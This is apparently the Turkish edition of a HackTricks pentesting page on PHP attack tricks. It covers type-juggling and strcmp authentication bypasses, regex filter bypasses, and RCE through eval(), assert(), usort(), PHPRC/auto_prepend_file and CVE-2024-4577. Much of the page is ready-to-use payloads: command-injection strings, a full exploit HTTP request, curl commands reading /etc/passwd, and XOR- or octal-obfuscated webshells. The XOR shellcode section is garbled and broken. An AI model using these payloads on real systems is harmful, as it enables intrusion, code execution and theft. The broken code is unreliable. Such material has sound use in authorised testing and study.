# PHP Tricks

{{#include ../../../banners/hacktricks-training.md}}


## Çerezlerin yaygın konumu:

Bu, phpMyAdmin çerezleri için de geçerlidir.

Çerezler:
```
PHPSESSID
phpMyAdmin
```
Konumlar:
```
/var/lib/php/sessions
/var/lib/php5/
/tmp/
Example: ../../../../../../tmp/sess_d1d531db62523df80e1153ada1d4b02e
```
## PHP karşılaştırmalarını atlama

### Gevşek karşılaştırmalar/Tür Karıştırma ( == )

Eğer `==` PHP'de kullanılıyorsa, beklenmedik durumlar ortaya çıkabilir ve karşılaştırma beklenildiği gibi davranmayabilir. Bunun nedeni, "==" sadece aynı türe dönüştürülmüş değerleri karşılaştırmasıdır; eğer karşılaştırılan verilerin türünün de aynı olmasını istiyorsanız `===` kullanmalısınız.

PHP karşılaştırma tabloları: [https://www.php.net/manual/en/types.comparisons.php](https://www.php.net/manual/en/types.comparisons.php)

![](<../../../images/image (567).png>)

{% file src="../../../images/EN-PHP-loose-comparison-Type-Juggling-OWASP (1).pdf" %}

- `"string" == 0 -> True` Sayı ile başlamayan bir dize, bir sayıya eşittir
- `"0xAAAA" == "43690" -> True` Onaltılık veya ondalık formatta sayılardan oluşan dizeler, sayılar aynıysa diğer sayılar/dizelerle True sonucu ile karşılaştırılabilir (bir dizedeki sayılar sayılar olarak yorumlanır)
- `"0e3264578" == 0 --> True` "0e" ile başlayıp herhangi bir şeyle devam eden bir dize, 0'a eşittir
- `"0X3264578" == 0X --> True` "0" ile başlayıp herhangi bir harfle (X herhangi bir harf olabilir) ve ardından herhangi bir şeyle devam eden bir dize, 0'a eşittir
- `"0e12334" == "0" --> True` Bu çok ilginçtir çünkü bazı durumlarda "0" dizisinin girdiğini ve bununla karşılaştırılan bir içeriği kontrol edebilirsiniz. Bu nedenle, "0e" ile başlayan ve herhangi bir harf içermeyen bir hash oluşturacak bir değer sağlayabilirseniz, karşılaştırmayı atlayabilirsiniz. Bu formatta **zaten hashlenmiş dizeleri** burada bulabilirsiniz: [https://github.com/spaze/hashes](https://github.com/spaze/hashes)
- `"X" == 0 --> True` Bir dizedeki herhangi bir harf, int 0'a eşittir

Daha fazla bilgi için [https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09)

### **in_array()**

**Tür Karıştırma** varsayılan olarak `in_array()` fonksiyonunu da etkiler (katı bir karşılaştırma yapmak için üçüncü argümanı true olarak ayarlamanız gerekir):
```php
$values = array("apple","orange","pear","grape");
var_dump(in_array(0, $values));
//True
var_dump(in_array(0, $values, true));
//False
```
### strcmp()/strcasecmp()

Eğer bu fonksiyon **herhangi bir kimlik doğrulama kontrolü** (şifre kontrolü gibi) için kullanılıyorsa ve kullanıcı karşılaştırmanın bir tarafını kontrol ediyorsa, şifre değeri olarak bir dizi yerine boş bir dizi gönderebilir (`https://example.com/login.php/?username=admin&password[]=`) ve bu kontrolü atlayabilir:
```php
if (!strcmp("real_pwd","real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
if (!strcmp(array(),"real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
```
`strcasecmp()` ile aynı hata meydana gelir

### Katı Tür Dönüşümü

`===` **kullanılıyor olsa bile**, **karşılaştırmayı zayıf hale getiren** hatalar olabilir. Örneğin, eğer karşılaştırma **karşılaştırmadan önce veriyi farklı bir nesne türüne dönüştürüyorsa**:
```php
(int) "1abc" === (int) "1xyz" //This will be true
```
### preg_match(/^.\*/)

**`preg_match()`** kullanıcı girişini **doğrulamak** için kullanılabilir (bu, **kullanıcı girişinde** herhangi bir **kelime/regex**'in **kara liste**de olup olmadığını **kontrol eder** ve eğer yoksa, kodun çalışmasına devam etmesine izin verir).

#### Yeni satır atlatma

Ancak, regexp'yi sınırlandırırken `preg_match()` **kullanıcı girişinin sadece ilk satırını kontrol eder**, bu nedenle eğer bir şekilde girişi **birden fazla satırda** **gönderebilirseniz**, bu kontrolü atlatabilirsiniz. Örnek:
```php
$myinput="aaaaaaa
11111111"; //Notice the new line
echo preg_match("/1/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/1.*$/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/^.*1/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
echo preg_match("/^.*1.*$/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
```
Bu kontrolü atlamak için **değerin yeni satırlarla urlencoded olarak gönderilmesi** (`%0A`) veya **JSON verisi** gönderebiliyorsanız, **birkaç satırda** göndermeniz gerekebilir:
```php
{
"cmd": "cat /etc/passwd"
}
```
Find an example here: [https://ramadistra.dev/fbctf-2019-rceservice](https://ramadistra.dev/fbctf-2019-rceservice)

#### **Uzunluk hatası atlatma**

(Bu atlatma, görünüşe göre PHP 5.2.5 üzerinde denendi ve PHP 7.3.15 üzerinde çalıştırmayı başaramadım)\
Eğer `preg_match()`'e geçerli çok **büyük bir girdi** gönderebilirseniz, **işleyemeyecek** ve kontrolü **atlatabileceksiniz**. Örneğin, eğer bir JSON'u kara listeye alıyorsa, şunu gönderebilirsiniz:
```bash
payload = '{"cmd": "ls -la", "injected": "'+ "a"*1000001 + '"}'
```
From: [https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0](https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0)

#### ReDoS Bypass

Trick from: [https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223](https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223) and [https://mizu.re/post/pong](https://mizu.re/post/pong)

<figure><img src="../../../images/image (26).png" alt=""><figcaption></figcaption></figure>

Kısacası, sorun `preg_*` fonksiyonlarının PHP'de [PCRE kütüphanesi](http://www.pcre.org/) üzerine inşa edilmesinden kaynaklanıyor. PCRE'de belirli düzenli ifadeler, çok sayıda özyinelemeli çağrı kullanılarak eşleştirilir, bu da çok fazla yığın alanı kullanır. İzin verilen özyinelemelerin miktarını sınırlamak mümkündür, ancak PHP'de bu limit [varsayılan olarak 100.000](http://php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit) olup, bu yığında sığacak olandan fazladır.

[Bu Stackoverflow başlığı](http://stackoverflow.com/questions/7620910/regexp-in-preg-match-function-returning-browser-error) da bu konunun daha derinlemesine tartışıldığı gönderide bağlantılıydı. Görevimiz şimdi açıktı:\
**Regex'in 100_000+ özyineleme yapmasını sağlayacak bir girdi gönderin, bu da SIGSEGV'ye neden olacak, `preg_match()` fonksiyonunun `false` döndürmesini sağlayacak ve böylece uygulamanın girdimizin kötü niyetli olmadığını düşünmesine neden olacak, yükün sonunda `{system(<verybadcommand>)}` gibi bir sürpriz atarak SSTI --> RCE --> flag :)**.

Aslında regex terimleriyle, 100k "özyineleme" yapmıyoruz, bunun yerine "geri izleme adımlarını" sayıyoruz, ki bu da [PHP belgelerine](https://www.php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit) göre `pcre.backtrack_limit` değişkeninde varsayılan olarak 1_000_000 (1M) olarak ayarlanmıştır.\
Buna ulaşmak için, `'X'*500_001` 1 milyon geri izleme adımına (500k ileri ve 500k geri) yol açacaktır:
```python
payload = f"@dimariasimone on{'X'*500_001} {{system('id')}}"
```
### PHP obfuscation için Tip Karıştırma
```php
$obfs = "1"; //string "1"
$obfs++; //int 2
$obfs += 0.2; //float 2.2
$obfs = 1 + "7 IGNORE"; //int 8
$obfs = "string" + array("1.1 striiing")[0]; //float 1.1
$obfs = 3+2 * (TRUE + TRUE); //int 7
$obfs .= ""; //string "7"
$obfs += ""; //int 7
```
## Execute After Redirect (EAR)

Eğer PHP başka bir sayfaya yönlendiriyorsa ancak başlık `Location` ayarlandıktan sonra **`die`** veya **`exit`** fonksiyonu **çağrılmadıysa**, PHP çalışmaya devam eder ve verileri gövdeye eklemeye devam eder:
```php
<?php
// In this page the page will be read and the content appended to the body of
// the redirect response
$page = $_GET['page'];
header('Location: /index.php?page=default.html');
readfile($page);
?>
```
## Path Traversal ve Dosya Dahil Etme Sömürüsü

Kontrol et:

{{#ref}}
../../../pentesting-web/file-inclusion/
{{#endref}}

## Daha Fazla Hile

- **register_globals**: **PHP < 4.1.1.1** veya yanlış yapılandırılmışsa, **register_globals** aktif olabilir (veya davranışları taklit ediliyor olabilir). Bu, $\_GET gibi global değişkenlerde bir değer varsa örneğin $\_GET\["param"]="1234", **$param** aracılığıyla erişebileceğiniz anlamına gelir. Bu nedenle, HTTP parametreleri göndererek kod içinde kullanılan değişkenleri **üzerine yazabilirsiniz**.
- **Aynı alanın PHPSESSION çerezleri aynı yerde saklanır**, bu nedenle bir alanda **farklı çerezler farklı yollarla kullanılıyorsa**, bir yolun **diğer yolun çerezine erişmesini** sağlayabilirsiniz ve diğer yolun çerezinin değerini ayarlayabilirsiniz.\
Bu şekilde, eğer **her iki yol da aynı isimde bir değişkene erişiyorsa**, **o değişkenin path1'deki değeri path2'ye uygulanabilir**. Ve ardından path2, path1'in değişkenlerini geçerli olarak alacaktır (çereze path2'deki karşılık gelen ismi vererek).
- Makinenin kullanıcılarının **kullanıcı adlarını** aldığınızda, php dizinlerinin etkin olup olmadığını kontrol etmek için adresi kontrol edin: **/\~\<USERNAME>**.
- [**LFI ve RCE php sarmalayıcıları kullanarak**](../../../pentesting-web/file-inclusion/index.html)

### password_hash/password_verify

Bu fonksiyonlar genellikle PHP'de **şifrelerden hash oluşturmak** ve bir hash ile karşılaştırıldığında bir şifrenin doğru olup olmadığını **kontrol etmek** için kullanılır.\
Desteklenen algoritmalar: `PASSWORD_DEFAULT` ve `PASSWORD_BCRYPT` ( `$2y$` ile başlar). **PASSWORD_DEFAULT genellikle PASSWORD_BCRYPT ile aynı olduğunu** unutmayın. Ve şu anda, **PASSWORD_BCRYPT**'in **girişte 72 baytlık bir boyut sınırlaması** vardır. Bu nedenle, bu algoritma ile 72 bayttan daha büyük bir şeyi hashlemeye çalıştığınızda yalnızca ilk 72B kullanılacaktır:
```php
$cont=71; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
False

$cont=72; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
True
```
### HTTP başlıkları atlatma PHP hatalarını istismar etme

#### Başlıkları ayarladıktan sonra hata oluşturma

[**bu twitter dizisinde**](https://twitter.com/pilvar222/status/1784618120902005070?t=xYn7KdyIvnNOlkVaGbgL6A&s=19) 1000'den fazla GET parametresi veya 1000'den fazla POST parametresi veya 20 dosya gönderildiğinde, PHOP'un yanıtta başlıkları ayarlamayacağını görebilirsiniz.

Bu, örneğin CSP başlıklarının kodlarda ayarlanmasını atlatmaya olanak tanır:
```php
<?php
header("Content-Security-Policy: default-src 'none';");
if (isset($_GET["xss"])) echo $_GET["xss"];
```
#### Başlıkları ayarlamadan önce bir gövde doldurma

Eğer bir **PHP sayfası hataları yazdırıyorsa ve kullanıcı tarafından sağlanan bazı girdileri geri ekrana basıyorsa**, kullanıcı PHP sunucusunun geri dönen bazı **içeriği yeterince uzun** yapmasını sağlayabilir, böylece sunucu **başlıkları** yanıtın içine eklemeye çalıştığında bir hata verecektir.\
Aşağıdaki senaryoda **saldırgan sunucunun büyük hatalar vermesini sağladı** ve ekranda görebileceğiniz gibi PHP başlık bilgilerini **değiştirmeye çalıştığında, başaramadı** (örneğin CSP başlığı kullanıcıya gönderilmedi):

![](<../../../images/image (1085).png>)

## PHP fonksiyonlarında SSRF

Sayfayı kontrol edin:

{{#ref}}
php-ssrf.md
{{#endref}}

## Kod yürütme

**system("ls");**\
&#xNAN;**\`ls\`;**\
**shell_exec("ls");**

[Daha yararlı PHP fonksiyonları için bunu kontrol edin](php-useful-functions-disable_functions-open_basedir-bypass/index.html)

### **preg_replace()** ile **RCE**
```php
preg_replace(pattern,replace,base)
preg_replace("/a/e","phpinfo()","whatever")
```
"replace" argümanında kodu çalıştırmak için en az bir eşleşme gereklidir.\
Bu preg_replace seçeneği **PHP 5.5.0 itibarıyla kullanımdan kaldırılmıştır.**

### **Eval() ile RCE**
```
'.system('uname -a'); $dummy='
'.system('uname -a');#
'.system('uname -a');//
'.phpinfo().'
<?php phpinfo(); ?>
```
### **Assert() ile RCE**

php içindeki bu fonksiyon, **bir dize içinde yazılmış kodu çalıştırmanıza** olanak tanır ve **true veya false döndürür** (ve buna bağlı olarak yürütmeyi değiştirir). Genellikle kullanıcı değişkeni bir dize ortasına yerleştirilecektir. Örneğin:\
`assert("strpos($_GET['page']),'..') === false")` --> Bu durumda **RCE** elde etmek için şunu yapabilirsiniz:
```
?page=a','NeVeR') === false and system('ls') and strpos('a
```
Kod **sözdizimini** **bozmanız**, **payload**'ınızı **eklemeniz** ve sonra **tekrar düzeltmeniz** gerekecek. "**and" veya "%26%26" veya "|"** gibi **mantıksal işlemler** kullanabilirsiniz. "or", "||" çalışmaz çünkü eğer ilk koşul doğruysa payload'ımız çalışmayacaktır. Aynı şekilde ";" de çalışmaz çünkü payload'ımız çalışmayacaktır.

**Diğer bir seçenek**, dizeye komutun yürütülmesini eklemektir: `'.highlight_file('.passwd').'`

**Diğer bir seçenek** (eğer iç kodunuz varsa) bazı değişkenleri değiştirerek yürütmeyi değiştirmektir: `$file = "hola"`

### **RCE via usort()**

Bu fonksiyon, belirli bir fonksiyonu kullanarak bir dizi öğeyi sıralamak için kullanılır.\
Bu fonksiyonu kötüye kullanmak için:
```php
<?php usort(VALUE, "cmp"); #Being cmp a valid function ?>
VALUE: );phpinfo();#

<?php usort();phpinfo();#, "cmp"); #Being cmp a valid function ?>
```

```php
<?php
function foo($x,$y){
usort(VALUE, "cmp");
}?>
VALUE: );}[PHP CODE];#

<?php
function foo($x,$y){
usort();}phpinfo;#, "cmp");
}?>
```
**//** ile kodun geri kalanını yorumlayabilirsiniz.

Kapatmanız gereken parantez sayısını keşfetmek için:

- `?order=id;}//`: bir hata mesajı alıyoruz (`Parse error: syntax error, unexpected ';'`). Muhtemelen bir veya daha fazla parantez eksik.
- `?order=id);}//`: bir **uyarı** alıyoruz. Bu doğru görünüyor.
- `?order=id));}//`: bir hata mesajı alıyoruz (`Parse error: syntax error, unexpected ')' i`). Muhtemelen çok fazla kapanış parantezimiz var.

### **.httaccess ile RCE**

Eğer **.htaccess** yükleyebiliyorsanız, o zaman birkaç şeyi **yapılandırabilir** ve hatta kod çalıştırabilirsiniz (uzantısı .htaccess olan dosyaların **çalıştırılabilir** olduğunu yapılandırarak).

Farklı .htaccess shell'leri [burada](https://github.com/wireghoul/htshells) bulunabilir.

### Env Değişkenleri ile RCE

Eğer PHP'de **env değişkenlerini değiştirmeye** izin veren bir güvenlik açığı bulursanız (ve dosya yüklemeye izin veren başka bir güvenlik açığı, daha fazla araştırmayla belki bu aşılabilir), bu davranışı **RCE** elde etmek için kötüye kullanabilirsiniz.

- [**`LD_PRELOAD`**](../../../linux-hardening/privilege-escalation/index.html#ld_preload-and-ld_library_path): Bu env değişkeni, diğer ikili dosyaları çalıştırırken rastgele kütüphaneleri yüklemenize izin verir (ancak bu durumda çalışmayabilir).
- **`PHPRC`** : PHP'ye **konfigürasyon dosyasını nerede bulacağını** belirtir, genellikle `php.ini` olarak adlandırılır. Kendi konfigürasyon dosyanızı yükleyebilirseniz, o zaman `PHPRC`'yi ona işaret edecek şekilde kullanın. İkinci yüklenen dosyayı belirten bir **`auto_prepend_file`** girişi ekleyin. Bu ikinci dosya, PHP çalışma zamanı tarafından diğer kodlardan önce **çalıştırılan** normal **PHP kodunu** içerir.
1. Shell kodumuzu içeren bir PHP dosyası yükleyin.
2. Adım 1'de yüklediğimiz dosyayı çalıştırması için PHP ön işleyicisine talimat veren bir **`auto_prepend_file`** direktifi içeren ikinci bir dosya yükleyin.
3. `PHPRC` değişkenini adım 2'de yüklediğimiz dosyaya ayarlayın.
- Bu zinciri nasıl çalıştıracağınız hakkında daha fazla bilgi [**orijinal rapordan**](https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/) edinebilirsiniz.
- **PHPRC** - başka bir seçenek
- Eğer **dosya yükleyemezseniz**, FreeBSD'de **`stdin`**'i içeren "file" `/dev/fd/0` kullanabilirsiniz:
- `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'`
- Ya da RCE elde etmek için **`allow_url_include`**'yi etkinleştirip **base64 PHP kodu** ile bir dosya ekleyin:
- `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'`
- Teknik [**bu rapordan**](https://vulncheck.com/blog/juniper-cve-2023-36845).

### XAMPP CGI RCE - CVE-2024-4577

Web sunucusu HTTP isteklerini ayrıştırır ve bunları `php.exe cgi.php foo=bar` gibi bir isteği çalıştıran bir PHP betiğine iletir, bu da bir parametre enjeksiyonuna izin verir. Bu, gövde içindeki PHP kodunu yüklemek için aşağıdaki parametreleri enjekte etmeye olanak tanır:
```jsx
-d allow_url_include=1 -d auto_prepend_file=php://input
```
Ayrıca, PHP'nin sonraki normalizasyonu nedeniyle "-" parametresini 0xAD karakteri kullanarak enjekte etmek mümkündür. [**bu gönderiden**](https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577/) istismar örneğini kontrol edin.
```jsx
POST /test.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
Host: {{host}}
User-Agent: curl/8.3.0
Accept: */*
Content-Length: 23
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

<?php
phpinfo();
?>

```
## PHP Sanitizasyon atlatma & Brain Fuck

[**Bu yazıda**](https://blog.redteam-pentesting.de/2024/moodle-rce/) çok az karakterle izin verilen bir brain fuck PHP kodu oluşturmak için harika fikirler bulmak mümkün.\
Ayrıca, birkaç kontrolü atlatmalarını sağlayan fonksiyonları çalıştırmanın ilginç bir yolu da önerilmektedir:
```php
(1)->{system($_GET[chr(97)])}
```
## PHP Statik analizi

Bu fonksiyonlara yapılan çağrılarda kod ekleyip ekleyemeyeceğinizi kontrol edin (buradan):
```php
exec, shell_exec, system, passthru, eval, popen
unserialize, include, file_put_cotents
$_COOKIE | if #This mea
```
Eğer bir PHP uygulamasını hata ayıklıyorsanız, hata yazdırmayı global olarak etkinleştirmek için `/etc/php5/apache2/php.ini` dosyasına `display_errors = On` ekleyebilir ve apache'yi yeniden başlatabilirsiniz: `sudo systemctl restart apache2`

### PHP kodunu deşifre etme

PHP kodunu deşifre etmek için **web**[ **www.unphp.net**](http://www.unphp.net) **kullanabilirsiniz.**

## PHP Wrapper'ları ve Protokoller

PHP Wrapper'ları ve protokolleri, bir sistemde **yazma ve okuma korumalarını atlamanıza** ve onu tehlikeye atmanıza olanak tanıyabilir. [**daha fazla bilgi için bu sayfayı kontrol edin**](../../../pentesting-web/file-inclusion/index.html#lfi-rfi-using-php-wrappers-and-protocols).

## Xdebug kimlik doğrulaması yapılmamış RCE

Eğer `phpconfig()` çıktısında **Xdebug**'ın **etkin** olduğunu görüyorsanız, RCE elde etmeyi denemelisiniz [https://github.com/nqxcode/xdebug-exploit](https://github.com/nqxcode/xdebug-exploit)

## Değişken değişkenler
```php
$x = 'Da';
$$x = 'Drums';

echo $x; //Da
echo $$x; //Drums
echo $Da; //Drums
echo "${Da}"; //Drums
echo "$x ${$x}"; //Da Drums
echo "$x ${Da}"; //Da Drums
```
## RCE kötüye kullanımı yeni $\_GET\["a"]\($\_GET\["b"])

Eğer bir sayfada **rastgele bir sınıfın yeni bir nesnesini oluşturabiliyorsanız** RCE elde etme şansınız olabilir, nasıl yapılacağını öğrenmek için aşağıdaki sayfayı kontrol edin:

{{#ref}}
php-rce-abusing-object-creation-new-usd_get-a-usd_get-b.md
{{#endref}}

## Harf olmadan PHP çalıştırma

[https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/)

### Sekizli sayı kullanarak
```php
$_="\163\171\163\164\145\155(\143\141\164\40\56\160\141\163\163\167\144)"; #system(cat .passwd);
```
### **XOR**
```php
$_=("%28"^"[").("%33"^"[").("%34"^"[").("%2c"^"[").("%04"^"[").("%28"^"[").("%34"^"[").("%2e"^"[").("%29"^"[").("%38"^"[").("%3e"^"["); #show_source
$__=("%0f"^"!").("%2f"^"_").("%3e"^"_").("%2c"^"_").("%2c"^"_").("%28"^"_").("%3b"^"_"); #.passwd
$___=$__; #Could be not needed inside eval
$_($___); #If ¢___ not needed then $_($__), show_source(.passwd)
```
### XOR kolay shell kodu

[**bu yazıya** ](https://mgp25.com/ctf/Web-challenge/)göre, aşağıdaki şekilde kolay bir shellcode oluşturmak mümkündür:
```php
$_="`{{{"^"?<>/"; // $_ = '_GET';
${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);

$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_ = '_GET'; $_GET[_]($_GET[__]);
```
Yani, eğer **rakamlar ve harfler olmadan rastgele PHP çalıştırabiliyorsanız**, aşağıdaki gibi bir istek göndererek o yükü kötüye kullanarak rastgele PHP çalıştırabilirsiniz:
```
POST: /action.php?_=system&__=cat+flag.php
Content-Type: application/x-www-form-urlencoded

comando=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
```
Daha derin bir açıklama için [https://ctf-wiki.org/web/php/php/#preg_match](https://ctf-wiki.org/web/php/php/#preg_match) adresine bakın.

### XOR Shellcode (eval içinde)
```bash
#!/bin/bash

if [[ -z $1 ]]; then
echo "USAGE: $0 CMD"
exit
fi

CMD=$1
CODE="\$_='\
```

```php
lt;>/'^'{{{{';\${\$_}[_](\${\$_}[__]);" `$_='
```

```php
lt;>/'^'{{{{'; --> _GET` `${$_}[_](${$_}[__]); --> $_GET[_]($_GET[__])` `So, the function is inside $_GET[_] and the parameter is inside $_GET[__]` http --form POST "http://victim.com/index.php?_=system&__=$CMD" "input=$CODE"
```
### Perl benzeri
```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```
{{#include ../../../banners/hacktricks-training.md}}
